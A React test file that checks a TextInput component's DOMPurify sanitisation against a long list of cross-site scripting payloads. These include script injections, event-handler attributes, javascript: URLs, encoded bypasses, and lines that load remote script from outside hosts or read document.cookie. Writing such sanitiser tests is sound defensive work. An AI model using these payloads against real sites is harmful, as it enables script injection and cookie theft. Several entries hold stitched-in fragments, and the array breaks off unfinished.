import React, { useState } from 'react';
import { render, fireEvent, screen, cleanup } from '@testing-library/react';
import '@testing-library/jest-dom';
import TextInput from '../components/TextInput';

afterEach(cleanup);
const handleChange = jest.fn();
const Wrapper = ({ dompurifyConfig }: { dompurifyConfig?: { [key: string]: any } }) => {
  const [value, setValue] = useState('');
  const onChange = (newValue: string) => {
    setValue(newValue);
    handleChange(newValue);
  };
  return <TextInput value={value} onChange={onChange} dompurify={dompurifyConfig} />;
};

test('renders input', () => {
  render(<TextInput value="" onChange={() => { }} />);
  const inputElement = screen.getByRole('textbox');
  expect(inputElement).toBeInTheDocument();
});

test('prints input', () => {
  render(<Wrapper />);
  const inputElement = screen.getByRole('textbox');

  fireEvent.change(inputElement, { target: { value: 'Test' } });
  expect(inputElement).toHaveValue('Test');
  expect(handleChange).toHaveBeenCalledWith('Test');
});

test('sanitizes various inputs with DOMPurify', () => {
  render(<Wrapper />);
  const inputElement = screen.getByRole('textbox');

  const testCases = [
    { input: '<img src=x onerror=alert(1)//>', expected: '<img src="x">' },
    { input: '<script>alert("XSS")</script>', expected: '' },
    { input: '<a href="javascript:alert(1)">Click me</a>', expected: '<a>Click me</a>' },
    { input: '<div onclick="alert(1)">Hello</div>', expected: '<div>Hello</div>' },
    { input: '<img src="x" onerror="alert(1)" />', expected: '<img src="x">' },
    { input: '<img src=x onerror=alert(1)//>', expected: '<img src="x">' },
    { input: '<p>abc<iframe//src=jAva&Tab;script:alert(3)>def</p>', expected: '<p>abc</p>' },
    { input: '<math><mi//xlink:href="data:x,<script>alert(4)</script>">', expected: '<math><mi></mi></math>' },
    { input: '<TABLE><tr><td>HELLO</tr></TABLE>', expected: '<table><tbody><tr><td>HELLO</td></tr></tbody></table>' },
    { input: '<UL><li><A HREF=//google.com>click</UL>', expected: '<ul><li><a href="//google.com">click</a></li></ul>' },
    { input: '<svg><script xlink:href="data:application/javascript;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></script></svg>', expected: '<svg></svg>' },
    { input: '<a href=\'javascript:alert(1)\'>Click me</a>', expected: '<a>Click me</a>' },
    { input: '<input type=\'text\' value=\'\'><img src=\'x\' onerror=\'alert(1)\'>', expected: '<input value="" type="text"><img src="x">' },
  ];

  testCases.forEach(({ input, expected }) => {
    fireEvent.change(inputElement, { target: { value: input } });
    expect(inputElement).toHaveValue(expected);
    expect(handleChange).toHaveBeenCalledWith(expected);
  });
});

test('sanitizes input as per the dompurifyConfig', () => {
  render(
    <Wrapper
      dompurifyConfig={{
        ALLOWED_TAGS: ['em', 'strong', 'a'],
        ALLOWED_ATTR: ['href'],
        FORBID_TAGS: ['script'],
        FORBID_ATTR: ['onclick'],
        ALLOW_ARIA_ATTR: true,
        FORCE_BODY: true,
        FORBID_CSS: false,
        ALLOW_CSS_CLASSES: ['class1', 'class2'],
        SAFE_FOR_TWITTER: true,
        IN_PLACE: true,

      }}
    />
  );
  const inputElement = screen.getByRole('textbox');

  const testCases = [
    { input: '<b>Bold</b>', expected: 'Bold' },
    { input: '<i>Italic</i>', expected: 'Italic' },
    { input: '<em>Emphasis</em>', expected: '<em>Emphasis</em>' },
    { input: '<strong>Strong</strong>', expected: '<strong>Strong</strong>' },
    { input: '<a href="http://example.com">Link</a>', expected: '<a href="http://example.com">Link</a>' },
    { input: '<script>alert("XSS")</script>', expected: '' },
    { input: '<div>Hello</div>', expected: 'Hello' },
    { input: '<marquee>Hello world</marquee>', expected: 'Hello world' },
    { input: '<div aria-label="Test">Content</div>', expected: 'Content' },
    { input: '<html><body>Hello</body></html>', expected: 'Hello' },
    { input: '<a href="http://example.com">Link</a>', expected: '<a href="http://example.com">Link</a>' },
    { input: '<html><body><p>Paragraph</p></body></html>', expected: 'Paragraph' },
    { input: String.raw`'<script\x20type="text/javascript">javascript:alert(1);</script>'`, expected: 'javascript:alert(1);'},
    { input: String.raw`'><\x00script>javascript:alert(1)</script>'`, expected: '&gt;&lt;\x00script&gt;javascript:alert(1)'},
    { input: String.raw`'<script src=1 href=1 onerror="javascript:alert(1)"></script>'`, expected: ''},
    { input: String.raw`'<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>'`, expected: ''},
    { input: String.raw`'<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>'`, expected: ''},
    { input: String.raw`'\x3Cscript>javascript:alert(1)</script>'`, expected: '\x3Cscript&gt;javascript:alert(1)'},
    { input: String.raw`'><script>/\* _\x2Fjavascript:alert(1)// _/</script>'`, expected: '&gt;'},
    { input: String.raw`'<script>javascript:alert(1)</script\x0D'`, expected: ''},
    { input: String.raw`'<script charset="\x22>javascript:alert(1)</script>'`, expected: ''},
    { input: String.raw`'><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>'`, expected: '&gt;<p><svg></svg></p>'},
    { input: String.raw`'<script>/\* _\x2A/javascript:alert(1)// _/</script>'`, expected: ''},
    { input: String.raw`'<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>'`, expected: ''},
    { input: String.raw`'><\x00script>javascript:alert(1)</script>'`, expected: '&gt;&lt;\x00script&gt;javascript:alert(1)'},
    { input: String.raw`'<script src="data:text/plain\x2Cjavascript:alert(1)"></script>'`, expected: ''},
    { input: String.raw`'<script src="data:\xD4\x8F,javascript:alert(1)"></script>'`, expected: ''},
    { input: String.raw`'<script\x20type="text/javascript">javascript:alert(1);</script>'`, expected: 'javascript:alert(1);'},
    { input: String.raw`'><script>\x0Djavascript:alert(1)</script>'`, expected: '&gt;'},
    { input: String.raw`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>'`, expected: '&gt;'},
    { input: String.raw`'<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>'`, expected: ''},
    { input: String.raw`'<b <script>alert(1)</script>0'`, expected: '<b>alert(1)0</b>'},
    { input: String.raw`'<? foo="><x foo='?><script>javascript:alert(1)</script>'>">'`, expected: '&gt;'},
    { input: String.raw`'<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>'`, expected: '<div id="d"></div>'},
    { input: String.raw`'<!--[if]><script>javascript:alert(1)</script -->'`, expected: ''},
    { input: String.raw`'<script src="/\%(jscript)s"></script>'`, expected: ''},
    { input: String.raw`'<script>({set/**/$($){\_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>'`, expected: ''},
    { input: String.raw`'<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>'`, expected: ''},
    { input: String.raw`'<script>ReferenceError.prototype.**defineGetter**('name', function(){javascript:alert(1)}),x</script>'`, expected: ''},
    { input: String.raw`'<script>Object.**noSuchMethod** = Function,[{}][0].constructor.\_('javascript:alert(1)')()</script>'`, expected: ''},
    { input: String.raw`'<script>%(payload)s</script>'`, expected: ''},
    { input: String.raw`'<script src=%(jscript)s></script>'`, expected: ''},
    { input: String.raw`'<script language='javascript' src='%(jscript)s'></script>'`, expected: ''},
    { input: String.raw`'<script>javascript:alert(1)</script>'`, expected: ''},
    { input: String.raw`'<SCRIPT SRC="%(jpg)s"></SCRIPT>'`, expected: ''},
    { input: String.raw`'<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>'`, expected: ''},
    { input: String.raw`'<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >'`, expected: ''},
    { input: String.raw`'<SCRIPT SRC=//ha.ckers.org/.j>'`, expected: ''},
    { input: String.raw`'<!--#exec cmd="/bin/echo '<SCR--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>-->'`, expected: ''},
    { input: String.raw`'<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>'`, expected: String.raw`'alert("XSS")'); ?&gt;'`},
    { input: String.raw`'<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">'`, expected: ''},
    { input: String.raw`'<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>'`, expected: ''},
    { input: String.raw`'<script>for((i)in(self))eval(i)(1)</script>'`, expected: ''},
    { input: String.raw`'<image/src/onerror=prompt(8)>'`, expected: '<img src="">'},
    { input: String.raw`'<IMG onmouseover="alert('xxs')">'`, expected: '<img>'},
    { input: String.raw`'><img src=xxx:x \x0Bonerror=javascript:alert(1)> ,'`, expected: '&gt;<img>'},
    { input: String.raw`'<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>'`, expected: ''},
    { input: String.raw`'<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->'`, expected: ''},
    { input: String.raw`'<image src =q onerror=prompt(8)>'`, expected: '<img src="q">'},
    { input: String.raw`'<IMG SRC=x onsearch="alert(String.fromCharCode(88,83,83))">'`, expected: '<img src="x">'},
    { input: String.raw`'<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">'`, expected: '<img src="x">'},
    { input: String.raw`'<IMG LOWSRC="javascript:alert('XSS')">'`, expected: '<img>'},
    { input: String.raw`'><img src=x onerror=window.open('https://www.google.com/');>'`, expected: '&gt;<img src="x">'},
    { input: String.raw`'<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">'`, expected: '<img style="xss:expr/*XSS*/ession(javascript:alert(1))">'},
    { input: String.raw`'<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>'`, expected: '<a class="XSS"></a>'},
    { input: String.raw`'<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>''`, expected: String.raw`'<svg><style>{font-family:'</style></svg>'`},
    { input: String.raw`'<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>'`, expected: ''},
    { input: String.raw`'<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>'`, expected: ''},
    { input: String.raw`'<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>'`, expected: ''},
    { input: String.raw`'<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>'`, expected: ''},
    { input: String.raw`'<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>'`, expected: ''},
    { input: String.raw`'<style>@import "data:,\*%7bx:expression(javascript:alert(1))%7D";</style>'`, expected: ''},
    { input: String.raw`'<style>\*[{}@import'%(css)s?]</style>X'`, expected: 'X'},
    { input: String.raw`'</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>'`, expected: String.raw`'/<svg><style>{src:'<style>'/</style></style></svg>'`},
    { input: String.raw`'<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>'`, expected: ''},
    { input: String.raw`'<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS'`, expected: '<ul><li>XSS</li></ul>'},
    { input: String.raw`'<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">'`, expected: ''},
    { input: String.raw`'<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a'`, expected: '<a>X</a>'},
    { input: String.raw`'<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>'`, expected: '<svg></svg>'},
    { input: String.raw`'onclick=prompt(8)><svg/onload=prompt(8)>"@x.y'`, expected: 'onclick=prompt(8)&gt;<svg>"@x.y</svg>'},
    { input: String.raw`'<body onload="document.vulnerable=true;">'`, expected: ''},
    { input: String.raw`'<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>'`, expected: ''},
    { input: String.raw`'<body/onload=&lt;!--&gt;&#10alert(1)>'`, expected: ''},
    { input: String.raw`'<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>'`, expected: '<br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input>'},
    { input: String.raw`'<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>'`, expected: ''},
    { input: String.raw`'<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>'`, expected: ''},
    { input: String.raw`'<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>'`, expected: ''},
    { input: String.raw`'<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>'`, expected: ''},
    { input: String.raw`'<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>'`, expected: String.raw`'SCRIPT]]&gt;alert('gotcha');/SCRIPT]]&gt;'`},
    { input: String.raw`'<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>'`, expected: ''},
    { input: String.raw`'<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>'`, expected: ' <label></label>'},
    { input: String.raw`'<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>'`, expected: 'XSS""","XML namespace."),("""<i><b>&lt;IMG SRC="javascript:javascript:alert(1)"&gt;</b></i><span></span>'},
    { input: String.raw`'<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>'`, expected: ''},
    { input: String.raw`'<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>'`, expected: ' <label></label>'},
    { input: String.raw`'<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">'`, expected: '<div id="x">x</div>'},
    { input: String.raw`'<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>'`, expected: 'XSS""","XML namespace."),("""<i><b>&lt;IMG SRC="javascript:javascript:alert(1)"&gt;</b></i><span></span>'},
    { input: String.raw`'<xml src="javascript:document.vulnerable=true;">'`, expected: ''},
    { input: String.raw`'<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>'`, expected: ''},
    { input: String.raw`'<frameset onload=javascript:javascript:alert(1)></frameset>'`, expected: ''},
    { input: String.raw`'<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>'`, expected: ''},
    { input: String.raw`'<frameset onload=javascript:alert(1)>'`, expected: ''},
    { input: String.raw`'<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>'`, expected: ''},
    { input: String.raw`'<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>'`, expected: ''},
    { input: String.raw`'<audio src=1 href=1 onerror="javascript:alert(1)"></audio>'`, expected: '<audio href="1" src="1"></audio>'},
    { input: String.raw`'<audio src=1 onerror=alert(1)>'`, expected: '<audio src="1"></audio>'},
    { input: String.raw`'<video src=1 href=1 onerror="javascript:alert(1)"></video>'`, expected: '<video href="1" src="1"></video>'},
    { input: String.raw`'<video><source onerror="javascript:javascript:alert(1)">'`, expected: '<video><source></video>'},
    { input: String.raw`'<video onerror="javascript:javascript:alert(1)"><source>'`, expected: '<video><source></video>'},
    { input: String.raw`'<video/poster/onerror=alert()>'`, expected: '<video poster=""></video>'},
    { input: String.raw`'0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"'`, expected: '0\"autofocus/onfocus=alert(1)--&gt;<video poster="">"-confirm(3)-"</video>'},
    { input: String.raw`'<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>'`, expected: ''},
    { input: String.raw`'<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>'`, expected: ''},
    { input: String.raw`'<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>'`, expected: '<a id="fuzzelement1" href="javascript\x3Ajavascript:alert(1)">test</a>'},
    { input: String.raw`'<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>'`, expected: '<a style="pointer-events:none;position:absolute;"></a><a style="position:absolute;">XXX</a><a>XXX</a>'},
    { input: String.raw`'1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>'`, expected: '1'},
    { input: String.raw`'1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>'`, expected: '1<a href="#"></a>'},
    { input: String.raw`'<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>'`, expected: '<a style="behavior:url(#default#AnchorClick);">XXX</a>'},
    { input: String.raw`'<a onmouseover="alert(document.cookie)">xxs link</a>'`, expected: '<a>xxs link</a>'},
    { input: String.raw`'exp/_<A STYLE='no\xss:noxss("_//*");xss:ex/*XSS*//*/_/pression(alert("XSS"))'>'`, expected: String.raw`'exp/_<a style="no\xss:noxss(&quot;_//*&quot;);xss:ex/*XSS*//*/_/pression(alert(&quot;XSS&quot;))">'</a>`},
    { input: String.raw`'<A HREF="http://66.102.7.147/">XSS</A>'`, expected: '<a href="http://66.102.7.147/">XSS</a>'},
    { input: String.raw`'<form><a href="javascript:\u0061lert&#x28;1&#x29;">X'`, expected: '<form><a>X</a></form>'},
    { input: String.raw`'<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>'`, expected: '<a>Click Here</a>'},
    { input: String.raw`'<math><a xlink:href="//jsfiddle.net/t846h/">click'`, expected: '<math></math>'},
    { input: String.raw`'<form><a href="javascript:\u0061lert&#x28;1&#x29;">X'`, expected: '<form><a>X</a></form>'},
    { input: String.raw`'<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a'`, expected: 'XYZ'},
    { input: String.raw`'<math><a xlink:href="//jsfiddle.net/t846h/">click'`, expected: '<math></math>'},
    { input: String.raw`'<a onmouseover=alert(document.cookie)>xxs link</a>'`, expected: '<a>xxs link</a>'},
    { input: String.raw`'<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>'`, expected: '<a>Click Here</a>'},
    { input: String.raw`'<math><a xlink:href="//jsfiddle.net/t846h/">click'`, expected: '<math></math>'},
    { input: String.raw`'<math><a xlink:href="//jsfiddle.net/t846h/">click'`, expected: '<math></math>'},
    { input: String.raw`'1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>'`, expected: '1'},
    { input: String.raw`'<math><a xlink:href="//jsfiddle.net/t846h/">click'`, expected: '<math></math>'},
    { input: String.raw`'<a href="javascript#document.vulnerable=true;">'`, expected: '<a href="javascript#document.vulnerable=true;"></a>'},
    { input: String.raw`'<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X'`, expected: '<form id="test"><input></form><button>X</button>'},
    { input: String.raw`'<form><button formaction="javascript:javascript:alert(1)">X'`, expected: '<form><button>X</button></form>'},
    { input: String.raw`'<form><isindex formaction="javascript&colon;confirm(1)"'`, expected: '<form></form>'},
    { input: String.raw`'<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>'`, expected: '<form><textarea></textarea></form>'},
    { input: String.raw`'//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//'`, expected: '//<form><input type="submit">//</form>'},
    { input: String.raw`'&#00;</form><input type&#61;"date" onfocus="alert(1)">'`, expected: '�<input>'},
    { input: String.raw`'<form><button formaction="javascript:alert(XSS)">lol'`, expected: '<form><button>lol</button></form>'},
    { input: String.raw`'<form><isindex formaction="javascript&colon;confirm(1)"'`, expected: '<form></form>'},
    { input: String.raw`'<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>'`, expected: '<form><textarea></textarea></form>'},
    { input: String.raw`'<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>'`, expected: '<form></form>'},
    { input: String.raw`'&#00;</form><input type&#61;"date" onfocus="alert(1)">'`, expected: '�<input>'},
    { input: String.raw`'<form><button formaction=javascript&colon;alert(1)>CLICKME'`, expected: '<form><button>CLICKME</button></form>'},
    { input: String.raw`'<table background="javascript:javascript:alert(1)">'`, expected: '<table></table>'},
    { input: String.raw`'<table><TD BACKGROUND="javascript:document.vulnerable=true;">'`, expected: '<table><tbody><tr><td></td></tr></tbody></table>'},
    { input: String.raw`'<object src=1 href=1 onerror="javascript:alert(1)"></object>'`, expected: ''},
    { input: String.raw`'<object onError object onError="javascript:javascript:alert(1)"></object onError>'`, expected: ''},
    { input: String.raw`'<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>'`, expected: ''},
    { input: String.raw`'<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>'`, expected: ''},
    { input: String.raw`'<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>'`, expected: ''},
    { input: String.raw`'<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">'`, expected: ''},
    { input: String.raw`'<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>'`, expected: ''},
    { input: String.raw`'<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>'`, expected: 'XSS'},
    { input: String.raw`'<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>'`, expected: ''},
    { input: String.raw`'<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>'`, expected: 'javascript:alert(1);'},
    { input: String.raw`'<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>'`, expected: '<marquee></marquee>'},
    { input: String.raw`'<marquee onstart='javascript:alert&#x28;1&#x29;'>^**^'`, expected: '<marquee>^\**^</marquee>'},
    { input: String.raw`'>><marquee><h1>XSS</h1></marquee>'`, expected: '&gt;&gt;<marquee><h1>XSS</h1></marquee>'},
    { input: String.raw`'<iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>'`, expected: '<marquee><h1>XSS by xss</h1></marquee>'},
    { input: String.raw`'<marquee onstart='javascript:alert('1');'>=(◕*◕)='`, expected: '<marquee>=(◕*◕)=</marquee>' },
    { input: String.raw`'<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>'`, expected: ''},
    { input: String.raw`'<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>'`, expected: ''},
    { input: String.raw`'<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>'`, expected: ''},
    { input: String.raw`'<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">'`, expected: ''},
    { input: String.raw`'<input value=<><iframe/src=javascript:confirm(1)'`, expected: '<input value="<">'},
    { input: String.raw`'<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>'`, expected: ''},
    { input: String.raw`'<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>'`, expected: ''},
    { input: String.raw`'><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>'`, expected: '&gt;<h1>123</h1>'},
    { input: String.raw`'><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="alert(document.cookie)"></IFRAME>123</h1>'`, expected: '&gt;<h1>123</h1>'},
    { input: String.raw`'<iframe src="vbscript:document.vulnerable=true;">'`, expected: ''},
    { input: String.raw`'<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>'`, expected: ''},
    { input: String.raw`'<math href="javascript:javascript:alert(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>'`, expected: '<math>CLICKME</math> <math> CLICKME </math>'},
    { input: String.raw`'<embed src="data:text/html;base64,%(base64)s">'`, expected: ''},
    { input: String.raw`'<x style="background:url('x&#1;;color:red;/*')">XXX</x>'`, expected: 'XXX'},
    { input: String.raw`'<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi'`, expected: '&amp;ADz&amp;AGn&amp;AG0&amp;AEf&amp;ACA&amp;AHM&amp;AHI&amp;AGO&amp;AD0&amp;AGn&amp;ACA&amp;AG8Abg&amp;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&amp;ACAAPABi'},
    { input: String.raw`'<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>'`, expected: ''},
    { input: String.raw`'<event-source src="%(event)s" onload="javascript:alert(1)">'`, expected: ''},
    { input: String.raw`'<BR SIZE="&{javascript:alert(1)}">'`, expected: '<br size="&amp;{javascript:alert(1)}">'},
    { input: String.raw`'<LAYER SRC="%(scriptlet)s"></LAYER>'`, expected: ''},
    { input: String.raw`'<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">'`, expected: ''},
    { input: String.raw`'<BASE HREF="javascript:javascript:alert(1);//">'`, expected: ''},
    { input: String.raw`'<embed code=javascript:javascript:alert(1);></embed>'`, expected: ''},
    { input: String.raw`'</plaintext\></|\><plaintext/onmouseover=prompt(1)'`, expected: ''},
    { input: String.raw`'<var onmouseover="prompt(1)">On Mouse Over</var>'`, expected: '<var>On Mouse Over</var>'},
    { input: String.raw`'<var onmouseover="prompt(1)">On Mouse Over</var>'`, expected: '<var>On Mouse Over</var>'},
    { input: String.raw`'<isindex/autofocus/onfocus=alert()>'`, expected: ''},
    { input: String.raw`'[<blockquote cite="]">[" onmouseover="alert('RVRSH3LL_XSS');" ]'`, expected: String.raw`'[<blockquote cite="]">[" onmouseover="alert('RVRSH3LL_XSS');" ]</blockquote>'`},
    { input: String.raw`'<w contenteditable id=x onfocus=alert()>'`, expected: ''},
    { input: String.raw`'<math href="javascript:javascript:alert(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>'`, expected: '<math>CLICKME</math> <math> CLICKME </math>'},
    { input: String.raw`'1<set/xmlns="urn:schemas-microsoft-com:time" style="beh&#x41vior:url(#default#time2)" attributename="innerhtml" to="&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;">'`, expected: '1'},
    { input: String.raw`'<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>'`, expected: ''},
    { input: String.raw`'perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out'`, expected: String.raw`'perl -e 'print \"alert(\"XSS\")\";' &gt; out'`},
    { input: String.raw`'<TD BACKGROUND="javascript:alert('XSS')">'`, expected: ''},
    { input: String.raw`'<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>'`, expected: ''},
    { input: String.raw`'<~/XSS STYLE=xss:expression(alert('XSS'))>'`, expected: String.raw`'&lt;~/XSS STYLE=xss:expression(alert('XSS'))&gt;'`},
    { input: String.raw`'<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";>;'`, expected: String.raw`'&lt;;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";&gt;;'`},
    { input: String.raw`'<;IMG SRC=";mocha:[code]";>;'`, expected: '&lt;;IMG SRC=";mocha:[code]";&gt;;'},
    { input: String.raw`'<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;'`, expected: String.raw`'&lt;;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;;&lt;;param name=url value=javascript:alert(';XSS';)&gt;;&lt;;/OBJECT&gt;;'`},
